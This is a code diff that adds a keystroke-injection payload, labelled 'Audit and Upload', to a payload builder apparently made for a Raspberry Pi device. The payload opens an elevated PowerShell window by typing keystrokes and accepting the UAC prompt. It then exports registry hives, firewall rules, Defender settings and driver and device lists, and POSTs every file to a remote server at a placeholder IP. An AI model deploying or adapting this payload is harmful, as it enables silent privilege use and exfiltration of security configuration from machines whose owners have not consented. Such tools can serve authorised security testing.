@@ -259,6 +259,36 @@ class PayloadBuilder:
             ]
         }
         
+        # Full audit with auto-upload
+        self.payloads['audit_and_upload'] = {
+            'name': 'Audit and Upload',
+            'description': 'Exports all data and uploads to Pi automatically',
+            'commands': [
+                {'action': 'combo', 'keys': ['WIN', 'r']},
+                {'action': 'delay', 'ms': 500},
+                {'action': 'type', 'text': 'powershell'},
+                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
+                {'action': 'delay', 'ms': 1500},
+                {'action': 'combo', 'keys': ['ALT', 'y']},
+                {'action': 'delay', 'ms': 1000},
+                {'action': 'type', 'text': '$ip="{{SERVER_IP}}";'},
+                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
+                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
+                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw;'},
+                {'action': 'type', 'text': 'Get-MpPreference|ConvertTo-Json -Depth 5>C:\\defender.json;'},
+                {'action': 'type', 'text': 'pnputil /enum-drivers>C:\\drivers.txt;'},
+                {'action': 'type', 'text': 'pnputil /enum-devices>C:\\devices.txt;'},
+                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");'},
+                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://$ip:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f}}}'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 10000},
+                {'action': 'type', 'text': 'exit'},
+                {'action': 'key', 'name': 'ENTER'},
+            ]
+        }
+        
         # Upload audit files to Pi
         self.payloads['upload_files'] = {
             'name': 'Upload Audit Files',
